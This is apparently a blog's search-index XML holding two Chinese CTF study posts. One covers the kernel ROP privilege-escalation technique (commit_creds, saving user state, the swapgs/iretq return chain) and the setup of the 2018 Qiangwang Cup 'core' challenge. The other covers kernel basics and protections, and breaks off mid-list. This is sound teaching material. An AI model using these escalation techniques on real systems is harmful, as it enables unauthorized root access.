<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kernel expolitation</title>
    <link href="/2025/08/26/kernel%20expolitation/"/>
    <url>/2025/08/26/kernel%20expolitation/</url>
    
    <content type="html"><![CDATA[<h1 id="kernel-rop"><a href="#kernel-rop" class="headerlink" title="kernel rop"></a>kernel rop</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内核 ROP 与普通的 ROP 无区别，只不过 system(&#x2F;bin&#x2F;sh) 变为了 commit_cred(&amp;init_cred) 或者 commit_creds(prepare_kernel(NULL))，当在内核中执行这样的代码，当前线程的 cred 结构体便会变为 init 进程的 cred 的拷贝，也就获得了 root 权限</p><p>关于 &amp;init_cred</p><p>是一个全局变量，类似</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> <span class="hljs-title">init_cred</span> =</span> &#123;<br>    .usage     = ATOMIC_INIT(<span class="hljs-number">4</span>),<br>    .uid       = GLOBAL_ROOT_UID,   <span class="hljs-comment">// = 0</span><br>    .gid       = GLOBAL_ROOT_GID,   <span class="hljs-comment">// = 0</span><br>    .euid      = GLOBAL_ROOT_UID,   <span class="hljs-comment">// = 0</span><br>    .egid      = GLOBAL_ROOT_GID,   <span class="hljs-comment">// = 0</span><br>    .suid      = GLOBAL_ROOT_UID,   <span class="hljs-comment">// = 0</span><br>    .sgid      = GLOBAL_ROOT_GID,   <span class="hljs-comment">// = 0</span><br>    .fsuid     = GLOBAL_ROOT_UID,   <span class="hljs-comment">// = 0</span><br>    .fsgid     = GLOBAL_ROOT_GID,   <span class="hljs-comment">// = 0</span><br>    ...<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>表示 root 权限</p><p>prepare_kernel(0) 会新建一个和 root 的 cred ，类似复制 init_cred</p><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>我们在内核中完成提权后，最终仍然要回到用户态以获得一个 root 权限的 shell，所以当我们脚本进入内核态时需要手动模拟保存寄存器</p><p>通常情况下我们都是保存在自己的变量之中的，以便于构造 rop 链</p><p>这里 wiki 给出了一个模板，intel 风格，需要指定参数 -masm&#x3D;intel</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>  <span class="hljs-comment">//这里 user_cs 等都是我们自己定义的变量</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Status has been saved.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h2><p>返回用户态流程</p><ul><li>swapgs 恢复 GS 寄存器</li><li>sysretq 或者 iretq 恢复到用户空间</li></ul><p>我们只要在内核中找到相应的 gadget 并执行 swapgs;iretq 就可以返回到用户态</p><p>通常来说，rop 链应如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">↓   swapgs<br>    iretq<br>    user_shell_addr<br>    user_cs<br>    user_eflags //64bit user_rflags<br>    user_sp<br>    user_ss<br></code></pre></td></tr></table></figure><p>有时候会引发栈平衡的问题，这时候可以调整 sp 寄存器的值来通过（加减8）</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h3><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>题目给了 bzImage，core.cpio，start.sh，以及带符号表的 vmlinux</p><p>vmlinux 是未经压缩的 kernel ELF 文件，我们可以从中找到一些gadget，可以用 ROPgadget 或 ropper 对齐进行提取，当然直接用 ropper 分析也是可以的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ropper --file ./vmlinux --nocolor &gt; gadget_ropper.txt<br>ROPgadget --binary ./vmlinux &gt; gadget_ropgadget.txt<br></code></pre></td></tr></table></figure><p>如果没有给 vmlinux，可以用 extract-vmlinux 提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>-m 64M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s  \<br>-netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p>可以看到开了 kaslr，顺便复习一下 kaslr</p><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>内核的地址随机化保护，会给内核加载地址加上随机偏移，但偏移量同一，所有函数，全局变量，gadget都是这个偏移</p><p>所以我们需要先泄露出某个函数的真实地址，减去其未启用 kaslr 时的地址，就可以得到偏移</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><span class="hljs-built_in">chmod</span> 666 /dev/ptmx<br><span class="hljs-built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict <span class="hljs-comment"># kptr_restrict设为1，这样我们就不可以通过/proc/kallsyms直接读取函数的地址了</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict <span class="hljs-comment"># 该值设为1表示不可通过dmesg查看kernel信息了</span><br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>第 9 行将符号表导出到 &#x2F;tmp&#x2F;kallsyms，这样普通用户也可以读到</p><p>第 18 行表示 120 秒后强制关机，可以去掉，无影响</p>]]></content>
    
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kernel基础知识及环境搭建</title>
    <link href="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p> <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">基础知识 - CTF Wiki</a> </p><h1 id="Operating-System-Kernel"><a href="#Operating-System-Kernel" class="headerlink" title="Operating System Kernel"></a>Operating System Kernel</h1><p> 操作系统内核（Operation System Kernel） 本质上是一种软件，是应用与硬件的中间层，主要作用是调用系统资源、控制 IO 设备及操作网络与文件系统等</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754637988167.png"></p><p>其本质与用户进程无异，都是在物理内存中的代码+数据</p><p>不同在于当 cpu 执行内核代码是运行在<strong>最高权限</strong>，可以完全访问硬件，而执行用户的代码一般在低权限</p><h1 id="hierarchical-protection-domains"><a href="#hierarchical-protection-domains" class="headerlink" title="hierarchical protection domains"></a>hierarchical protection domains</h1><p> <strong>分级保护域</strong>（hierarchical protection domains），一种将计算机不同资源划分为不同权限的模型，在一些硬件或者微代码级别上提供不同特权态模式的 cpu 架构上，保护环通常是硬件强制的</p><p>从最高到最低为 Ring0-Ring3</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754639038432.png"></p><p>现代操作系统用通常只会使用过 Ring0 和 Ring3，对应内核和用户进程</p><ul><li>用户态：CPU 运行在 Ring3 + 用户进程运行环境上下文</li><li>内核态：CPU 运行在 Ring0 + 内核代码运行环境上下文</li></ul><h1 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h1><ul><li>中断与异常（interrupt &amp; exception）：CPU 收到中断&#x2F;异常时，切换到 Ring0 ，并根据中断描述符表索引对应代码并执行</li><li>特权级相关指令：CPU 运行到这些指令时状态发生改变<ul><li>iret （0-&gt;3）</li><li>stsenter （3-&gt;0）</li></ul></li></ul><h2 id="用户态-内核态（系统调用）"><a href="#用户态-内核态（系统调用）" class="headerlink" title="用户态-&gt;内核态（系统调用）"></a>用户态-&gt;内核态（系统调用）</h2><p>发生系统调用、产生异常、外设产生中断等事件时，会进入内核态并用对应的处理程序进行处理</p><p>进入内核态后</p><ul><li>通过 swapgs 切换 GS 段寄存器吗，将其与一个特定位置的值交换，为了保存段寄存器和切换到内核执行的 GS 寄存器</li><li>将当前栈顶记录在 CPU 独占变量区域里，将里面记录的内核栈顶赋给 RSP&#x2F;ESP</li><li>push 保存各项寄存器的值</li><li>通过汇编指令判断是否为 x32_abi（使用 64 位寄存器和调用约定，但将指针限制为 32 位以节省内存）</li><li>通过系统调用好，跳到全局变量 sys_call_table 相应位置执行系统调用</li></ul><h2 id="内核态-用户态"><a href="#内核态-用户态" class="headerlink" title="内核态-&gt;用户态"></a>内核态-&gt;用户态</h2><ul><li>通过 swspgs 恢复 GS 寄存器值</li><li>通过 ssyretq 或 iretq 恢复到用户空间继续执行，使用 iretq 还需要给出用户空间的一些信息（CS，esp&#x2F;rsp 等）</li></ul><h1 id="虚拟内存空间"><a href="#虚拟内存空间" class="headerlink" title="虚拟内存空间"></a>虚拟内存空间</h1><p>计算机虚拟内存地址空间一般被分为两块</p><ul><li>供用户使用的用户空间（use space）</li><li>供内核使用的内核空间（kernel space）</li></ul><p>对于 linux 来说，较高虚拟地址被分配给内核，而低虚拟地址给了用户进程</p><p>32 位虚拟内存空间布局：</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754668056185.png"></p><p>64</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754668075998.png"></p><h1 id="进程权限管理"><a href="#进程权限管理" class="headerlink" title="进程权限管理"></a>进程权限管理</h1><p>内核调度一切系统资源并为用户应用提供运行环境，相应，应用权限也是由内核进行管理的2</p><h2 id="进程描述符（process-descriptor）"><a href="#进程描述符（process-descriptor）" class="headerlink" title="进程描述符（process descriptor）"></a>进程描述符（process descriptor）</h2><p>内核用结构体 task_struct 表示一个进程，该结构体在内核源码 include&#x2F;linux&#x2F;sched.h</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754729545783.png"></p><h2 id="进程权限凭证（credential）"><a href="#进程权限凭证（credential）" class="headerlink" title="进程权限凭证（credential）"></a>进程权限凭证（credential）</h2><p>task_struct 中有如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process credentials: */</span><br><br><span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">ptracer_cred</span>;</span><br><br><span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">real_cred</span>;</span><br><br><span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">cred</span>;</span><br></code></pre></td></tr></table></figure><p>cred 是一个结构体，用以管理一个进程的权限，定义在内核源码 include&#x2F;linux&#x2F;cred.h 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The security context of a task</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The parts of the context break down into two categories:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  (1) The objective context of a task.  These parts are used when some other</span><br><span class="hljs-comment"> *  task is attempting to affect this one.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  (2) The subjective context.  These details are used when the task is acting</span><br><span class="hljs-comment"> *  upon another object, be that a file, a task, a key or whatever.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Note that some members of this structure belong to both categories - the</span><br><span class="hljs-comment"> * LSM security pointer for instance.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span><br><span class="hljs-comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span><br><span class="hljs-comment"> * context is used whenever that task is acted upon.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * task-&gt;cred points to the subjective context that defines the details of how</span><br><span class="hljs-comment"> * that task is going to act upon another object.  This may be overridden</span><br><span class="hljs-comment"> * temporarily to point to another security context, but normally points to the</span><br><span class="hljs-comment"> * same context as task-&gt;real_cred.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_long_t</span>   usage;<br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;  <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;  <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;   <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;  <span class="hljs-comment">/* LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span>   <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucounts</span> *<span class="hljs-title">ucounts</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span>  <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-comment">/* RCU deletion */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">int</span> non_rcu;            <span class="hljs-comment">/* Can we skip RCU deletion? */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span>        <span class="hljs-comment">/* RCU deletion hook */</span><br>    &#125;;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>一个结构体中记载了一个进程四种不同的用户 ID ，通常情况下这几个 ID 应当都是相同的</p><ul><li><p>真实用户 ID （reak UID）：标识一个进程启动时的用户 ID</p></li><li><p>保存用户 ID（saved UID）：标识一个进程最初的有效用户 ID</p></li><li><p>有效用户 ID （effective UID）：标识一个进程正在运行时所属的用户 ID （运行时是可以该表所属用户的）因此权限机制也是利用该 ID 来认证的</p><p>内核通过 euid 来进行特权判断，为了防止用户一直在高权限，当任务完成后，euid 会与 suid 交换，恢复进程有效权限</p></li><li><p>文件系统用户 ID（UID for VFS ops）：标识一个进程创建文件时进行标识的用户 ID</p></li></ul><p>用户组 ID 同样分为 4 个，真实组 ID，保存组 ID，有效组 ID，文件系统组 ID，与用户 ID 类似</p><h2 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h2><p>只要改变一个进程的 cred 结构体，就可以改变其权限</p><p>内核空间由两个函数，都位于 kernel&#x2F;cred.c 中</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code> ：该函数用于拷贝一个进程的 cred 结构体，并返回一个新 cred 结构体。需要注意 daemon 参数应为有效的进程描述符地址</li><li><code>int commit_creds(struct cred *new)</code>： 该函数用于将一个新 cred 结构体应用到进程之中</li></ul><h1 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules(LKMs)"></a>Loadable Kernel Modules(LKMs)</h1><p>背景：linux 内核采用宏内核架构，一切系统服务都由内核提供，虽然效率高但是缺乏可扩展性和维护性，所以</p><p>-&gt; <strong>可装载内核模块</strong>（Loadable Kernel Modules，简称 LKMs）出现了 ，位于内核空间的它可以提供新的系统调用或其他服务，同时其可以像积木一样可以装载进内核或从内核中卸载掉，大大提高了 kernel 的可拓展性和可维护性</p><p>常见 LKMs：</p><ul><li>驱动设备<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块</li></ul><p>LKMs 的文件格式和用户可执行程序相同</p><ul><li>linux：ELF</li><li>windos ：exe&#x2F;dll</li><li>mac：MACH-O</li></ul><p>可以用 IDA 等工具来分析内核模块</p><p>模块可被单独编译，但不能单独运行。它在运行时被链接到内核上当作其一部分在内核空间运行，这与运行在用户进程的不同</p><p>模块通常来实现一种文件系统、一个驱动程序或者其他内核上层的功能</p><h2 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h2><ul><li>insmod：将指定模块加载到内核</li><li>rmmod：从内核卸载模块</li><li>lsmod ：列出已加载的模块</li><li>modprobe：添加或删除模块，modeprobe 在加载模块时会查找依赖关系</li></ul><p>大多数 CTF 中的 kernel vulnerability 也是出现在 LKMs 中</p><h1 id="内核交互"><a href="#内核交互" class="headerlink" title="内核交互"></a>内核交互</h1><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>系统调用只用户的程序向操作系统内核请求更高权限的服务，比如 IO 操作或进程间通信</p><p>系统调用提供用户程序和操作系统间的接口，部分库函数如 scanf puts 等 IO 相关操作就是对 read write 系统调用的封装</p><blockquote><p> 在 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h 和 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。 </p></blockquote><h2 id="系统调用：ioctl"><a href="#系统调用：ioctl" class="headerlink" title="系统调用：ioctl"></a>系统调用：ioctl</h2><p>在 linux 中，几乎所有设备都被视为文件，这使通过标准文件操作来访问设备更简单，但某些操作超出标准接口（比如 read&#x2F;write ）的能力，比如我要改变设备工作模式或查询设备状态等，这时候就需要 ioctl 了</p><p>ioctl：一个专门用于设备输入输出操作的一个系统调用，其函数原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ioctl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> request, ...)</span><br></code></pre></td></tr></table></figure><ul><li>fd：文件描述符</li><li>request：对设备的指令</li><li>再后边的参数就是一些与设备有关的补充参数</li></ul><h1 id="常见内核态函数"><a href="#常见内核态函数" class="headerlink" title="常见内核态函数"></a>常见内核态函数</h1><p>内核中不可使用 C 库函数，但是内核中有其对应的各种函数</p><ul><li>printf()-&gt;printk() 但是要注意其不一定把内容显示到终端上，但一定在内核缓冲区中，可用 dmesg 查看效果</li><li>memcpy()-&gt;copt_from_user()&#x2F;copy_to_user()<ul><li>第一个将用户空间数据传到内核空间</li><li>第二个则相反</li></ul></li><li>malloc()-&gt;kamlloc 内核的内存分配函数，和 malloc() 类似，但使用的使 slab&#x2F;slub 分配器</li><li>free()-&gt;kfree()</li></ul><p>改变权限的函数</p><ul><li>int commit_creds(struct cred *new)</li><li>struct cred* prepare_kernel_cred(struct task_struct* daemon)</li></ul><p> 执行 commit_creds(prepare_kernel_cred(&amp;init_task)) 即可获得 root 权限 ，也是最常用的提权手段，函数名及变量可在 &#x2F;proc&#x2F;kallsyms 中查看</p><h1 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h1><h2 id="通用保护机制"><a href="#通用保护机制" class="headerlink" title="通用保护机制"></a>通用保护机制</h2><h3 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h3><p><strong>内核空间地址随机化</strong>，与用户程序的 ASLR 类似，在内核镜像映射到实际地址空间时加上一个偏移值（粒度 256MB），但是其内部相对偏移任然不变</p><p>对于未开启 KASLR 时，内核代码段基址为   0xffffffff81000000 ，direct mapping area （直接映射区）的基址为 0xffff888000000000 </p><h3 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h3><p><strong>函数粒度的内核地址空间随机化</strong>，是对 KASLR 保护的加强版</p><p>KASLR 虽然能够一定程度上缓解攻击，但若攻击者获取到了内核中某个地址，仍然可以通过偏移从而得到整个内核地址空间布局</p><p>该保护方式使内核在编译时把每个函数做成独立的代码块，启动时内核会随机排列这些函数的顺序再拼起来，这样</p><ul><li>函数之间偏移就是随机的了</li><li>无法通过泄露一个函数的地址而知道整个内核的地址空间排布</li></ul><h3 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a>STACK PROTECTOR</h3><p>类似 canary，通常又称 stakc cookie，检测是否发生栈溢出，若发生则产生 kernel panic</p><p>内核中的 canary 值通常取子 GS 段寄存器某个固定偏移处的值</p><h3 id="SMAP-SMEP"><a href="#SMAP-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h3><p> SMAP 即 <strong>管理模式访问保护</strong>（Supervisor Mode Access Prevention），SMEP 即<strong>管理模式执行保护</strong>（Supervisor Mode Execution Prevention） </p><p>通常同时开启</p><ul><li>SMAP 